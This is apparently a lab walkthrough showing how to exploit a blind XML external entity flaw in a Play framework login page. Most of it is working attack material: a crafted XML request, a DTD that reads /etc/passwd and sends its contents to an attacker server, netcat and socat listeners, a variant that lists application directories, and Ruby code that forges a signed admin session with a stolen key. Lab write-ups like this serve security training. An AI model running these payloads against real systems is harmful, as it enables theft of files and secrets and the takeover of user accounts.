# Play XML Entities

Like Ruby-on-Rails, Play (auto-magically) manages multiple content-types when it receives HTTP requests. Here the application is really simple  and has nothing to do with XML, it's just a simple login page. However,  since the Play framework automatically parses XML requests, we are able  to exploit this bug to read arbitrary files.

### Vulnerability

XML entities can be used to tell the XML parser to fetch specific content:

- From the filesystem.
- From a web server (HTTP, HTTPs).
- From a FTP server.
- ...

this attack is completely blind and no information will be displayed in  the response. That's why we will need another way to get information  out. 

### Exploit Theory

![Exploitation steps](https://assets.pentesterlab.com/play_xxe/steps.png)

My preferred way of doing this (as it's a blind attack involving multiple steps) is to have 4 terminals next to each other:

- One to send the initial request (step 1).
- One to serve the DTD (step 2&3)
- One to retrieve the information sent by the server (step 5).
- One for debugging purpose.

### Initial Request

we can see that when we try to log in, a POST request is sent:

```
POST /login HTTP/1.1
Host: vulnerable
User-Agent: PentesterLab 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://vulnerable/login
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test
```

We will now need to modify this request to send XML, to do this, we will need:

- Remove all the unneeded information to make debugging easier.
- To add the XML message in the body of the request.
- To change the `Content-Type` of the request.

```
POST /login HTTP/1.1
Host: vulnerable
Connection: close
Content-Type: text/xml
Content-Length: 36

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://192.168.159.1:3000/test.dtd">
<foo>&e1;</foo>
```

Where `http://192.168.159.1:3000/test.dtd` is the location of the Attacker Server

If all goes well, the server should respond with a HTTP 400 error as it's unable to retrieve the DTD. 

### Serving the DTD

In reality the server may not be able to detect our server. So we have to detect what is preventing that

The easiest ways to do that are:

- Run a tiny web server  in the foreground. python webserver

To force the server to send you the content, you will need to use the following DTD:

```xml-dtd
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?%p1;'>">
%p2;
```

Add this inside test.dtd

**This DTD will force the XML parser to read the content of `/etc/passwd` and assigned it to the variable `p1`. Then it will create another variable `p2` that contains a link to your malicious server and the value of `p1`. Then it will print the value of `p2` using the `%p2`. After parsing the DTD will look like:**

```
<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?[/etc/passwd]'>
```

**Where `[/etc/passwd]` is the content of `/etc/passwd`.**

**If you look back at the initial request that we sent, the body contains a reference to `e1`: `<foo>&e1;</foo>`.**

**Once the server finished processing the DTD, it will resolve the reference to `e1` and send the content of `/etc/passwd` to your server.**



### Retrieving information

- `netcat -l -p 3001` but you will need to restart the process every time you access the TCP port.
- `socat TCP-LISTEN:3001,reuseaddr,fork -` that will not shutdown after the first request but can block after few requests.

### Finding a secret url

after url decoding the contents of `/etc/passwd` we can see a **play** user exists

the home directory of this user is `/opt/play-2.1.3/xxe/` 

depending on the xml parser , it's also possible to retrieve the listing of a directory.

```xml-dtd
<!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe/">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?%p1;'>">
%p2;
```

Using this, you should be able to find `conf/routes`. Once you managed to retrieve this `routes` file, you should be able to access the secret URL.

### Tampering the session

By convention, this code is available in `app/controllers/Application.java` (or `.scala` )

we can see that the session management is done by using a variable named `user` that gets put in the session:

```
      User user = User.findByUsername(username);
      if (user!=null) {
          if (user.password.equals(md5(username+":"+password) )) {
            session("user",username);
            return redirect("/");
```

We will need to forge a Play session that contains the variable `user` with the value `admin`. 

In play session.

The previous pattern was:

```
signature-%00name1:value1%00%00name2:value2%00
```

In this version of Play, the following is used:

```
signature-name1=value1&name2=value2
```

now we will add our own variable `user=admin`

Finally, we can sign the session, the original code looks like:

```
  def sign(message: String, key: Array[Byte]): String = {
    val mac = Mac.getInstance("HmacSHA1")
    mac.init(new SecretKeySpec(key, "HmacSHA1"))
    Codecs.toHexString(mac.doFinal(message.getBytes("utf-8")))
  }
```

In ruby, this can be done using:

```
KEY = "[KEY FOUND IN conf/application.conf]"
def sign(data)
  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, KEY,data)
end
```